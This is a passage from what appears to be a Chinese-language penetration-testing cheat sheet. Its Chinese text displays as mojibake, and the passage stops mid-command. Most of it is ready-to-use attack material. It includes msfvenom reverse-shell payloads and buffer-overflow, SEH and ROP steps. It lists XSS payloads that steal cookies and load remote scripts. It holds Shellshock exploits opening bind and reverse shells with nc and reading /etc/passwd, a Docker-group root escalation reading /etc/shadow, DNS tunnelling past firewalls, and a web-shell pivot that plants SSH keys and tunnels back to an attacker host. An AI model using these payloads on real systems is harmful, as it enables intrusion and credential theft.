Shell</h3><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></div><div class="code"><pre><div class="line"># http://baike.baidu.com/view/418628.htm</div><div class="line"># å¼€å¯ X æœåŠ¡å™¨ (:1 â€“ ç›‘å¬ TCP ç«¯å£ 6001)</div><div class="line">apt-get install xnest</div><div class="line">Xnest :1</div><div class="line"></div><div class="line"># è®°å¾—æˆæƒæ¥è‡ªç›®æ ‡ IP çš„è¿æ¥</div><div class="line">xterm -display 127.0.0.1:1</div><div class="line"></div><div class="line"># æˆæƒè®¿é—®</div><div class="line">xhost +targetip</div><div class="line"></div><div class="line"># åœ¨ç›®æ ‡æœºå™¨ä¸Šè¿æ¥å›æˆ‘ä»¬çš„ X æœåŠ¡å™¨</div><div class="line">xterm -display attackerip:1</div><div class="line">/usr/openwin/bin/xterm -display attackerip:1</div><div class="line">or</div><div class="line">$ DISPLAY=attackerip:0 xterm</div></pre></div></div></figure><h3 id="Windows-ç¼“å†²åŒºæº¢å‡ºåˆ©ç”¨å‘½ä»¤"><a href="#Windows-ç¼“å†²åŒºæº¢å‡ºåˆ©ç”¨å‘½ä»¤" class="headerlink" title="Windows ç¼“å†²åŒºæº¢å‡ºåˆ©ç”¨å‘½ä»¤"></a>Windows ç¼“å†²åŒºæº¢å‡ºåˆ©ç”¨å‘½ä»¤</h3><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></div><div class="code"><pre><div class="line">msfvenom -p windows/shell_bind_tcp -a x86 --platform win -b &quot;\x00&quot; -f c</div><div class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=X.X.X.X LPORT=443 -a x86 --platform win -e x86/shikata_ga_nai -b &quot;\x00&quot; -f c</div></pre></div></div></figure><h3 id="COMMONLY-USED-BAD-CHARACTERS"><a href="#COMMONLY-USED-BAD-CHARACTERS" class="headerlink" title="COMMONLY USED BAD CHARACTERS:"></a>COMMONLY USED BAD CHARACTERS:</h3><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></div><div class="code"><pre><div class="line">\x00\x0a\x0d\x20                              For http request</div><div class="line">\x00\x0a\x0d\x20\x1a\x2c\x2e\3a\x5c           Ending with (0\n\r_)</div><div class="line"></div><div class="line"># å¸¸ç”¨å‘½ä»¤:</div><div class="line">pattern create</div><div class="line">pattern offset (EIP Address)</div><div class="line">pattern offset (ESP Address)</div><div class="line">add garbage upto EIP value and add (JMP ESP address) in EIP . (ESP = shellcode )</div><div class="line"></div><div class="line">!pvefindaddr pattern_create 5000</div><div class="line">!pvefindaddr suggest</div><div class="line">!pvefindaddr modules</div><div class="line">!pvefindaddr nosafeseh</div><div class="line"></div><div class="line">!mona config -set workingfolder C:\Mona\%p</div><div class="line">!mona config -get workingfolder</div><div class="line">!mona mod</div><div class="line">!mona bytearray -b &quot;\x00\x0a&quot;</div><div class="line">!mona pc 5000</div><div class="line">!mona po EIP</div><div class="line">!mona suggest</div></pre></div></div></figure><h2 id="SEH-â€“-ç»“æ„åŒ–å¼‚å¸¸å¤„ç†"><a href="#SEH-â€“-ç»“æ„åŒ–å¼‚å¸¸å¤„ç†" class="headerlink" title="SEH â€“ ç»“æ„åŒ–å¼‚å¸¸å¤„ç†"></a>SEH â€“ ç»“æ„åŒ–å¼‚å¸¸å¤„ç†</h2><blockquote><p>SEH(â€œStructured Exception Handlingâ€)ï¼Œå³ç»“æ„åŒ–å¼‚å¸¸å¤„ç†ï¼Œæ˜¯ windows æ“ä½œç³»ç»Ÿæä¾›ç»™ç¨‹åºè®¾è®¡è€…çš„å¼ºæœ‰åŠ›çš„å¤„ç†ç¨‹åºé”™è¯¯æˆ–å¼‚å¸¸çš„æ­¦å™¨ã€‚<br><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></div><div class="code"><pre><div class="line"># https://en.wikipedia.org/wiki/Microsoft-specific_exception_handling_mechanisms#SEH</div><div class="line"># http://baike.baidu.com/view/243131.htm</div><div class="line">!mona suggest</div><div class="line">!mona nosafeseh</div><div class="line">nseh=&quot;\xeb\x06\x90\x90&quot; (next seh chain)</div><div class="line">iseh= !pvefindaddr p1 -n -o -i (POP POP RETRUN or POPr32,POPr32,RETN)</div></pre></div></div></figure></p></blockquote><h2 id="ROP-DEP"><a href="#ROP-DEP" class="headerlink" title="ROP (DEP)"></a>ROP (DEP)</h2><blockquote><p>ROP(â€œReturn-Oriented Programmingâ€)æ˜¯è®¡ç®—æœºå®‰å…¨æ¼æ´åˆ©ç”¨æŠ€æœ¯ï¼Œè¯¥æŠ€æœ¯å…è®¸æ”»å‡»è€…åœ¨å®‰å…¨é˜²å¾¡çš„æƒ…å†µä¸‹æ‰§è¡Œä»£ç ï¼Œå¦‚ä¸å¯æ‰§è¡Œçš„å†…å­˜å’Œä»£ç ç­¾åã€‚</p></blockquote><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></div><div class="code"><pre><div class="line">DEP(â€œData Execution Preventionâ€)æ˜¯ä¸€å¥—è½¯ç¡¬ä»¶æŠ€æœ¯ï¼Œåœ¨å†…å­˜ä¸Šä¸¥æ ¼å°†ä»£ç å’Œæ•°æ®è¿›è¡ŒåŒºåˆ†ï¼Œé˜²æ­¢æ•°æ®å½“åšä»£ç æ‰§è¡Œã€‚</div><div class="line"></div><div class="line"># https://en.wikipedia.org/wiki/Return-oriented_programming</div><div class="line"># https://zh.wikipedia.org/wiki/%E8%BF%94%E5%9B%9E%E5%AF%BC%E5%90%91%E7%BC%96%E7%A8%8B</div><div class="line"># https://en.wikipedia.org/wiki/Data_Execution_Prevention</div><div class="line"># http://baike.baidu.com/item/DEP/7694630</div><div class="line">!mona modules</div><div class="line">!mona ropfunc -m *.dll -cpb &quot;\x00\x09\x0a&quot;</div><div class="line">!mona rop -m *.dll -cpb &quot;\x00\x09\x0a&quot; (auto suggest)</div></pre></div></div></figure><p>##ASLR â€“ åœ°å€ç©ºé—´æ ¼å±€éšæœºåŒ–</p><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></div><div class="code"><pre><div class="line"># https://en.wikipedia.org/wiki/Address_space_layout_randomization</div><div class="line"># http://baike.baidu.com/view/3862310.htm</div></pre></div></div></figure><p>##å¯»è›‹(EGG Hunter)æŠ€æœ¯</p><blockquote><p>Egg huntingè¿™ç§æŠ€æœ¯å¯ä»¥è¢«å½’ä¸ºâ€œåˆ†çº§shellcodeâ€ï¼Œå®ƒä¸»è¦å¯ä»¥æ”¯æŒä½ ç”¨ä¸€å°æ®µç‰¹åˆ¶çš„shellcodeæ¥æ‰¾åˆ°ä½ çš„å®é™…çš„ï¼ˆæ›´å¤§çš„ï¼‰shellcodeï¼ˆæˆ‘ä»¬çš„â€˜é¸¡è›‹â€˜ï¼‰ï¼ŒåŸç†å°±æ˜¯é€šè¿‡åœ¨å†…å­˜ä¸­æœç´¢æˆ‘ä»¬çš„æœ€ç»ˆshellcodeã€‚æ¢å¥è¯è¯´ï¼Œä¸€æ®µçŸ­ä»£ç å…ˆæ‰§è¡Œï¼Œç„¶åå†å»å¯»æ‰¾çœŸæ­£çš„shellcodeå¹¶æ‰§è¡Œã€‚â€“ å‚è€ƒè‡ªçœ‹é›ªè®ºå›ï¼Œæ›´å¤šè¯¦æƒ…å¯ä»¥æŸ¥é˜…æˆ‘åœ¨ä»£ç æ³¨é‡Šä¸­å¢åŠ çš„é“¾æ¥ã€‚</p></blockquote><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></div><div class="code"><pre><div class="line"># https://www.corelan.be/index.php/2010/01/09/exploit-writing-tutorial-part-8-win32-egg-hunting/</div><div class="line"># http://www.pediy.com/kssd/pediy12/116190/831793/45248.pdf</div><div class="line"># http://www.fuzzysecurity.com/tutorials/expDev/4.html</div><div class="line">!mona jmp -r esp</div><div class="line">!mona egg -t lxxl</div><div class="line">\xeb\xc4 (jump backward -60)</div><div class="line">buff=lxxllxxl+shell</div><div class="line">!mona egg -t &apos;w00t&apos;</div></pre></div></div></figure><h2 id="GDB-Debugger-å¸¸ç”¨å‘½ä»¤"><a href="#GDB-Debugger-å¸¸ç”¨å‘½ä»¤" class="headerlink" title="GDB Debugger å¸¸ç”¨å‘½ä»¤"></a>GDB Debugger å¸¸ç”¨å‘½ä»¤</h2><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></div><div class="code"><pre><div class="line"># è®¾ç½®æ–­ç‚¹</div><div class="line">break *_start</div><div class="line"></div><div class="line"># æ‰§è¡Œä¸‹ä¸€ä¸ªå‘½ä»¤</div><div class="line">next</div><div class="line">step</div><div class="line">n</div><div class="line">s</div><div class="line"></div><div class="line"># ç»§ç»­æ‰§è¡Œ</div><div class="line">continue</div><div class="line">c</div><div class="line"></div><div class="line"># æ•°æ®</div><div class="line">checking &apos;REGISTERS&apos; and &apos;MEMORY&apos;</div><div class="line"></div><div class="line"># æ˜¾ç¤ºå¯„å­˜å™¨çš„å€¼: (Decimal,Binary,Hex)</div><div class="line">print /d â€“&gt; Decimal</div><div class="line">print /t â€“&gt; Binary</div><div class="line">print /x â€“&gt; Hex</div><div class="line">O/P :</div><div class="line">(gdb) print /d $eax</div><div class="line">$17 = 13</div><div class="line">(gdb) print /t $eax</div><div class="line">$18 = 1101</div><div class="line">(gdb) print /x $eax</div><div class="line">$19 = 0xd</div><div class="line">(gdb)</div><div class="line"></div><div class="line"># æ˜¾ç¤ºç‰¹å®šå†…å­˜åœ°å€çš„å€¼</div><div class="line">command : x/nyz (Examine)</div><div class="line">n â€“&gt; Number of fields to display ==&gt;</div><div class="line">y â€“&gt; Format for output ==&gt; c (character) , d (decimal) , x (Hexadecimal)</div><div class="line">z â€“&gt; Size of field to be displayed ==&gt; b (byte) , h (halfword), w (word 32 Bit)</div></pre></div></div></figure><h2 id="XSS-å¤‡å¿˜å½•"><a href="#XSS-å¤‡å¿˜å½•" class="headerlink" title="XSS å¤‡å¿˜å½•"></a>XSS å¤‡å¿˜å½•</h2><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></div><div class="code"><pre><div class="line">https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet</div><div class="line">(&quot;&lt; iframes &gt; src=http://IP:PORT &lt;/ iframes &gt;&quot;)</div><div class="line"></div><div class="line">&lt;script&gt;document.location=http://IP:PORT&lt;/script&gt;</div><div class="line"></div><div class="line">&apos;;alert(String.fromCharCode(88,83,83))//\&apos;;alert(String.fromCharCode(88,83,83))//&quot;;alert(String.fromCharCode(88,83,83))//\&quot;;alert(String.fromCharCode(88,83,83))//â€“&gt;&lt;/SCRIPT&gt;&quot;&gt;&apos;&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;</div><div class="line"></div><div class="line">&quot;;!â€“&quot;&lt;XSS&gt;=&amp;amp;amp;&#123;()&#125;</div><div class="line"></div><div class="line">&lt;IMG SRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;</div><div class="line">&lt;IMG SRC=javascript:alert(&apos;XSS&apos;)&gt;</div><div class="line">&lt;IMG &quot;&quot;&quot;&gt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&quot;&quot;&gt;</div><div class="line">&lt;IMG SRC=&amp;amp;amp;#106;&amp;amp;amp;#97;&amp;amp;amp;#118;&amp;amp;amp;#97;&amp;amp;amp;#115;&amp;amp;amp;#99;&amp;amp;amp;#114;&amp;amp;amp;#105;&amp;amp;amp;#112;&amp;amp;amp;#116;&amp;amp;amp;#58;&amp;amp;amp;#97;&amp;amp;amp;#108;&amp;amp;amp;#101;&amp;amp;amp;#114;&amp;amp;amp;#116;&amp;amp;amp;#40;&amp;amp;amp;#39;&amp;amp;amp;#88;&amp;amp;amp;#83;&amp;amp;amp;#83;&amp;amp;amp;#39;&amp;amp;amp;#41;&gt;</div><div class="line"></div><div class="line">&lt;IMG SRC=&amp;amp;amp;#0000106&amp;amp;amp;#0000097&amp;amp;amp;#0000118&amp;amp;amp;#0000097&amp;amp;amp;#0000115&amp;amp;amp;#0000099&amp;amp;amp;#0000114&amp;amp;amp;#0000105&amp;amp;amp;#0000112&amp;amp;amp;#0000116&amp;amp;amp;#0000058&amp;amp;amp;#0000097&amp;amp;amp;#0000108&amp;amp;amp;#0000101&amp;amp;amp;#0000114&amp;amp;amp;#0000116&amp;amp;amp;#0000040&amp;amp;amp;#0000039&amp;amp;amp;#0000088&amp;amp;amp;#0000083&amp;amp;amp;#0000083&amp;amp;amp;#0000039&amp;amp;amp;#0000041&gt;</div><div class="line">&lt;IMG SRC=&quot;jav ascript:alert(&apos;XSS&apos;);&quot;&gt;</div><div class="line"></div><div class="line">perl -e &apos;print &quot;&lt;IMG SRC=javascript:alert(\&quot;XSS\&quot;)&gt;&quot;;&apos; &gt; out</div><div class="line"></div><div class="line">&lt;BODY onload!#$%&amp;amp;()*~+-_.,:;?@[/|\]^`=alert(&quot;XSS&quot;)&gt;</div><div class="line"></div><div class="line">(&quot;&gt;&lt; iframes http://google.com &lt; iframes &gt;)</div><div class="line"></div><div class="line">&lt;BODY BACKGROUND=&quot;javascript:alert(&apos;XSS&apos;)&quot;&gt;</div><div class="line">&lt;FRAMESET&gt;&lt;FRAME SRC=â€javascript:alert(&apos;XSS&apos;);&quot;&gt;&lt;/FRAMESET&gt;</div><div class="line">&quot;&gt;&lt;script &gt;alert(document.cookie)&lt;/script&gt;</div><div class="line">%253cscript%253ealert(document.cookie)%253c/script%253e</div><div class="line">&quot;&gt;&lt;s&quot;%2b&quot;cript&gt;alert(document.cookie)&lt;/script&gt;</div><div class="line">%22/%3E%3CBODY%20onload=â€™document.write(%22%3Cs%22%2b%22cript%20src=http://my.box.com/xss.js%3E%3C/script%3E%22)&apos;%3E</div><div class="line">&lt;img src=asdf onerror=alert(document.cookie)&gt;</div></pre></div></div></figure><h2 id="SSH-Over-SCTP-ä½¿ç”¨-Socat"><a href="#SSH-Over-SCTP-ä½¿ç”¨-Socat" class="headerlink" title="SSH Over SCTP (ä½¿ç”¨ Socat)"></a>SSH Over SCTP (ä½¿ç”¨ Socat)</h2><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></div><div class="code"><pre><div class="line"># è¿œç«¯æœåŠ¡å™¨</div><div class="line"># å‡è®¾ä½ å‡†å¤‡è®© SCTP socket ç›‘å¬ç«¯å£ 80/SCTP å¹¶ä¸” sshd ç«¯å£åœ¨ 22/TCP</div><div class="line">$ socat SCTP-LISTEN:80,fork TCP:localhost:22</div><div class="line"></div><div class="line"># æœ¬åœ°ç«¯</div><div class="line"># å°† SERVER_IP æ¢æˆè¿œç«¯æœåŠ¡å™¨çš„åœ°å€ï¼Œç„¶åå°† 80 æ¢æˆ SCTP ç›‘å¬çš„ç«¯å£å·</div><div class="line">$ socat TCP-LISTEN:1337,fork SCTP:SERVER_IP:80</div><div class="line"></div><div class="line"># åˆ›å»º socks ä»£ç†</div><div class="line"># æ›¿æ¢ username å’Œ -p çš„ç«¯å£å·</div><div class="line">$ ssh -lusername localhost -D 8080 -p 1337</div></pre></div></div></figure><h2 id="ä½¿ç”¨æ´‹è‘±ç½‘ç»œ"><a href="#ä½¿ç”¨æ´‹è‘±ç½‘ç»œ" class="headerlink" title="ä½¿ç”¨æ´‹è‘±ç½‘ç»œ"></a>ä½¿ç”¨æ´‹è‘±ç½‘ç»œ</h2><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></div><div class="code"><pre><div class="line"># å®‰è£…æœåŠ¡</div><div class="line">$ apt-get install tor torsocks</div><div class="line"></div><div class="line"># ç»‘å®š ssh åˆ° tor æœåŠ¡ç«¯å£ 80</div><div class="line"># /etc/tor/torrc</div><div class="line">SocksPolicy accept 127.0.0.1</div><div class="line">SocksPolicy accept 192.168.0.0/16</div><div class="line">Log notice file /var/log/tor/notices.log</div><div class="line">RunAsDaemon 1</div><div class="line">HiddenServiceDir /var/lib/tor/ssh_hidden_service/</div><div class="line">HiddenServicePort 80 127.0.0.1:22</div><div class="line">PublishServerDescriptor 0</div><div class="line">$ /etc/init.d/tor start</div><div class="line">$ cat /var/lib/tor/ssh_hidden_service/hostname</div><div class="line">3l5zstvt1zk5jhl662.onion</div><div class="line"></div><div class="line"># ssh å®¢æˆ·ç«¯è¿æ¥</div><div class="line">$ apt-get install torsocks</div><div class="line">$ torsocks ssh login@3l5zstvt1zk5jhl662.onion -p 80</div></pre></div></div></figure><h2 id="Metagoofil-â€“-å…ƒæ•°æ®æ”¶é›†å·¥å…·"><a href="#Metagoofil-â€“-å…ƒæ•°æ®æ”¶é›†å·¥å…·" class="headerlink" title="Metagoofil â€“ å…ƒæ•°æ®æ”¶é›†å·¥å…·"></a>Metagoofil â€“ å…ƒæ•°æ®æ”¶é›†å·¥å…·</h2><blockquote><p>Metagoofil æ˜¯ä¸€æ¬¾åˆ©ç”¨Googleæ”¶é›†ä¿¡æ¯çš„å·¥å…·ã€‚</p></blockquote><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></div><div class="code"><pre><div class="line"># http://www.edge-security.com/metagoofil.php</div><div class="line"># å®ƒå¯ä»¥è‡ªåŠ¨åœ¨æœç´ å¼•æ“ä¸­æ£€ç´¢å’Œåˆ†ææ–‡ä»¶ï¼Œè¿˜å…·æœ‰æä¾›Macåœ°å€ï¼Œç”¨æˆ·ååˆ—è¡¨ç­‰å…¶ä»–åŠŸèƒ½</div><div class="line">$ python metagoofil.py -d example.com -t doc,pdf -l 200 -n 50 -o examplefiles -f results.html</div></pre></div></div></figure><h2 id="åˆ©ç”¨-Shellshock"><a href="#åˆ©ç”¨-Shellshock" class="headerlink" title="åˆ©ç”¨ Shellshock"></a>åˆ©ç”¨ Shellshock</h2><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></div><div class="code"><pre><div class="line"># ä¸€ä¸ªå‘ç°å¹¶åˆ©ç”¨æœåŠ¡å™¨ Shellshock çš„å·¥å…·</div><div class="line"># https://github.com/nccgroup/shocker</div><div class="line">$ ./shocker.py -H 192.168.56.118  --command &quot;/bin/cat /etc/passwd&quot; -c /cgi-bin/status --verbose</div><div class="line"></div><div class="line"># æŸ¥çœ‹æ–‡ä»¶</div><div class="line">$ echo -e &quot;HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () &#123; :;&#125;; echo \$(&lt;/etc/passwd)\r\nHost: vulnerable\r\nConnection: close\r\n\r\n&quot; | nc 192.168.56.118 80</div><div class="line"></div><div class="line"># ç»‘å®š shell</div><div class="line">$ echo -e &quot;HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () &#123; :;&#125;; /usr/bin/nc -l -p 9999 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n&quot; | nc 192.168.56.118 80</div><div class="line"></div><div class="line"># åå¼¹ Shell</div><div class="line">$ nc -l -p 443</div><div class="line">$ echo &quot;HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () &#123; :;&#125;; /usr/bin/nc 192.168.56.103 443 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n&quot; | nc 192.168.56.118 80</div></pre></div></div></figure><h2 id="è·å–-Docker-çš„-Root"><a href="#è·å–-Docker-çš„-Root" class="headerlink" title="è·å– Docker çš„ Root"></a>è·å– Docker çš„ Root</h2><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></div><div class="code"><pre><div class="line"># è·å–  Docker çš„ Root</div><div class="line"># user å¿…é¡»åœ¨ docker ç”¨æˆ·ç»„ä¸­</div><div class="line">ek@victum:~/docker-test$ id</div><div class="line">uid=1001(ek) gid=1001(ek) groups=1001(ek),114(docker)</div><div class="line"></div><div class="line">ek@victum:~$ mkdir docker-test</div><div class="line">ek@victum:~$ cd docker-test</div><div class="line"></div><div class="line">ek@victum:~$ cat &gt; Dockerfile</div><div class="line">FROM debian:wheezy</div><div class="line"></div><div class="line">ENV WORKDIR /stuff</div><div class="line"></div><div class="line">RUN mkdir -p $WORKDIR</div><div class="line"></div><div class="line">VOLUME [ $WORKDIR ]</div><div class="line"></div><div class="line">WORKDIR $WORKDIR</div><div class="line">&lt;&lt; EOF</div><div class="line"></div><div class="line">ek@victum:~$ docker build -t my-docker-image .</div><div class="line">ek@victum:~$ docker run -v $PWD:/stuff -t my-docker-image /bin/sh -c \</div><div class="line">&apos;cp /bin/sh /stuff &amp;&amp; chown root.root /stuff/sh &amp;&amp; chmod a+s /stuff/sh&apos;</div><div class="line">./sh</div><div class="line">whoami</div><div class="line"># root</div><div class="line"></div><div class="line">ek@victum:~$ docker run -v /etc:/stuff -t my-docker-image /bin/sh -c &apos;cat /stuff/shadow&apos;</div></pre></div></div></figure><h2 id="ä½¿ç”¨-DNS-éš§é“ç»•è¿‡é˜²ç«å¢™"><a href="#ä½¿ç”¨-DNS-éš§é“ç»•è¿‡é˜²ç«å¢™" class="headerlink" title="ä½¿ç”¨ DNS éš§é“ç»•è¿‡é˜²ç«å¢™"></a>ä½¿ç”¨ DNS éš§é“ç»•è¿‡é˜²ç«å¢™</h2><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></div><div class="code"><pre><div class="line"># è®©æ•°æ®å’Œå‘½ä»¤ä½¿ç”¨ DNS éš§é“ä¼ è¾“ä»¥ç»•è¿‡é˜²ç«å¢™çš„æ£€æŸ¥</div><div class="line"># dnscat2 æ”¯æŒä»ç›®æ ‡ä¸»æœºä¸Šé¢ä¸Šä¼ å’Œä¸‹è½½å‘½ä»¤æ¥è·å–æ–‡ä»¶ã€æ•°æ®å’Œç¨‹åº</div><div class="line"></div><div class="line"># æœåŠ¡å™¨ (æ”»å‡»è€…)</div><div class="line">$ apt-get update</div><div class="line">$ apt-get -y install ruby-dev git make g++</div><div class="line">$ gem install bundler</div><div class="line">$ git clone https://github.com/iagox86/dnscat2.git</div><div class="line">$ cd dnscat2/server</div><div class="line">$ bundle install</div><div class="line">$ ruby ./dnscat2.rb</div><div class="line">dnscat2&gt; New session established: 16059</div><div class="line">dnscat2&gt; session -i 16059</div><div class="line"></div><div class="line"># å®¢æˆ·æœº (ç›®æ ‡)</div><div class="line"># https://downloads.skullsecurity.org/dnscat2/</div><div class="line"># https://github.com/lukebaggett/dnscat2-powershell</div><div class="line">$ dnscat --host &lt;dnscat server_ip&gt;</div><div class="line">ç¼–è¯‘ Assemble ä»£ç </div><div class="line"></div><div class="line">$ nasm -f elf32 simple32.asm -o simple32.o</div><div class="line">$ ld -m elf_i386 simple32.o simple32</div><div class="line"></div><div class="line">$ nasm -f elf64 simple.asm -o simple.o</div><div class="line">$ ld simple.o -o simple</div></pre></div></div></figure><h2 id="ä½¿ç”¨éäº¤äº’-Shell-æ‰“å…¥å†…ç½‘"><a href="#ä½¿ç”¨éäº¤äº’-Shell-æ‰“å…¥å†…ç½‘" class="headerlink" title="ä½¿ç”¨éäº¤äº’ Shell æ‰“å…¥å†…ç½‘"></a>ä½¿ç”¨éäº¤äº’ Shell æ‰“å…¥å†…ç½‘</h2><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></div><div class="code"><pre><div class="line"># ç”Ÿæˆ shell ä½¿ç”¨çš„ ssh å¯†é’¥</div><div class="line">$ wget -O - -q &quot;http://domain.tk/sh.php?cmd=whoami&quot;</div><div class="line">$ wget -O - -q &quot;http://domain.tk/sh.php?cmd=ssh-keygen -f /tmp/id_rsa -N \&quot;\&quot; &quot;</div><div class="line">$ wget -O - -q &quot;http://domain.tk/sh.php?cmd=cat /tmp/id_rsa&quot;</div><div class="line"></div><div class="line"># å¢åŠ ç”¨æˆ· tempuser </div><div class="line">$ useradd -m tempuser</div><div class="line">$ mkdir /home/tempuser/.ssh &amp;&amp; chmod 700 /home/tempuser/.ssh</div><div class="line">$ wget -O - -q &quot;http://domain.tk/sh.php?cmd=cat /tmp/id_rsa&quot; &gt; /home/tempuser/.ssh/authorized_keys</div><div class="line">$ chmod 700 /home/tempuser/.ssh/authorized_keys</div><div class="line">$ chown -R tempuser:tempuser /home/tempuser/.ssh</div><div class="line"></div><div class="line"># åå¼¹ ssh shell</div><div class="line">$ wget -O - -q &quot;http://domain.tk/sh.php?cmd=ssh -i /tmp/id_rsa -o StrictHostKeyChecking=no -R 127.0.0.1:8080:192.168.20.13:8080 -N -f tempuser@&lt;attacker_ip&gt;&quot;</div></pre></div></div></figure><h2 id="åˆ©ç”¨-POST-è¿œç¨‹å‘½ä»¤æ‰§è¡Œè·å–-Shell"><a href="#åˆ©ç”¨-POST-è¿œç¨‹å‘½ä»¤æ‰§è¡Œè·å–-Shell" class="headerlink" title="åˆ©ç”¨ POST è¿œç¨‹å‘½ä»¤æ‰§è¡Œè·å– Shell"></a>åˆ©ç”¨ POST è¿œç¨‹å‘½ä»¤æ‰§è¡Œè·å– Shell</h2><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></div><div class="code"><pre><div class="line">attacker:~$ curl -i -s -k  -X &apos;POST&apos; --data-binary $&apos;IP=%3Bwhoami&amp;submit=submit&apos; &apos;http://victum.tk/command.php&apos;</div><div class="line"></div><div class="line">attacker:~$ curl -i -s -k  -X &apos;POST&apos; --data-binary 